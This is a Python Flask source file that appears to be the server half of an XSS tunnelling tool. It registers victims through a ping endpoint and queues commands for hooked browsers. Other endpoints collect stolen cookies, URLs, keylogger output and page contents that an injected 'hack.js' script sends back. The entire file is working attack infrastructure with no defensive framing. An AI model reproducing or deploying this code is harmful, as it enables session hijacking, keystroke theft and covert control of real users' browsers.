from xss_tunnel_server import app, commandStore, victimStore
from xss_tunnel_server.model.victim import Victim
from xss_tunnel_server.model.shell_command import ShellCommand
from flask import json, jsonify, request, Response

@app.route('/receiveUrl/<id>',  methods=['POST'])
def receive_url(id):
    report_back(id, ShellCommand(id, 'getUrl', request.data))

    return Response(status=200)

@app.route('/receiveCookies/<id>',  methods=['POST'])
def receive_cookies(id):
    report_back(id, ShellCommand(id, 'getCookies', request.data))

    return Response(status=200)

@app.route('/receiveKeys/<id>',  methods=['POST'])
def receive_keys(id):
    report_back(id, ShellCommand(id, 'stopLogger', request.data.replace('undefined', '')))

    return Response(status=200)


@app.route('/receiveSite/<id>',  methods=['POST'])
def receive_site(id):
    victim = victimStore.getVictim(id)
    if victim:
        site = request.data.replace('<script src="/static/js/hack.js"></script>', '')
        victim.currentPage = site

    return Response(status=200)

@app.route('/ping/<id>',  methods=['GET'])
def ping(id):
    if not victimStore.hasVictim(id):
        victimStore.addVictim(id, Victim(id, request))

    victim = victimStore.getVictim(id)
    victim.updateLastSeen()

    if victim.hasCommands():
        command = victim.pollCommands()

        return jsonify(type = command['type'], metaData = command['metaData'])

    return 'ntp'

def report_back(id, command):
    commandStore.addCommand(id, command)
